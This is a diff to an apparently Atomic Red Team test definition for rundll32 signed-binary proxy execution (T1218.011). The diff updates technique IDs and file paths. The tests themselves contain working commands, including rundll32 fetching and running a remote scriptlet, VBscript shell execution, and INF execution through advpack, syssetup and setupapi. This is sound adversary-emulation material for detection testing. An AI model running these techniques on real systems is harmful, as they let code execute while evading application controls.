@@ -1,8 +1,8 @@
-attack_technique:
-- T1218.011
-display_name: Rundll32
+attack_technique: T1218.011
+display_name: 'Signed Binary Proxy Execution: Rundll32'
 atomic_tests:
 - name: Rundll32 execute JavaScript Remote Payload With GetObject
+  auto_generated_guid: cf3bdb9a-dd11-4b6c-b0d0-9e22b68a71be
   description: |
     Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.
   supported_platforms:
@@ -11,12 +11,13 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
   executor:
     command: |
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
     name: command_prompt
 - name: Rundll32 execute VBscript command
+  auto_generated_guid: 638730e7-7aed-43dc-bf8c-8117f805f5bb
   description: |
     Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
     Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
@@ -33,6 +34,7 @@ atomic_tests:
       rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
     name: command_prompt
 - name: Rundll32 advpack.dll Execution
+  auto_generated_guid: d91cae26-7fc1-457b-a854-34c8aad48c89
   description: |
     Test execution of a command using rundll32.exe with advpack.dll.
     Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
@@ -43,7 +45,7 @@ atomic_tests:
     inf_to_execute:
       description: Local location of inf file
       type: string
-      default: PathToAtomicsFolder\T1085\src\T1085.inf
+      default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -52,12 +54,13 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
     name: command_prompt
 - name: Rundll32 ieadvpack.dll Execution
+  auto_generated_guid: 5e46a58e-cbf6-45ef-a289-ed7754603df9
   description: |
     Test execution of a command using rundll32.exe with ieadvpack.dll.
     Upon execution calc.exe will be launched
@@ -69,7 +72,7 @@ atomic_tests:
     inf_to_execute:
       description: Local location of inf file
       type: string
-      default: PathToAtomicsFolder\T1085\src\T1085.inf
+      default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -78,12 +81,13 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
     name: command_prompt
 - name: Rundll32 syssetup.dll Execution
+  auto_generated_guid: 41fa324a-3946-401e-bbdd-d7991c628125
   description: |
     Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened
 
@@ -94,7 +98,7 @@ atomic_tests:
     inf_to_execute:
       description: Local location of inf file
       type: string
-      default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -103,12 +107,13 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
     name: command_prompt
 - name: Rundll32 setupapi.dll Execution
+  auto_generated_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
   description: |
     Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened
 
@@ -119,7 +124,7 @@ atomic_tests:
     inf_to_execute:
       description: Local location of inf file
       type: string
-      default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -128,7 +133,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
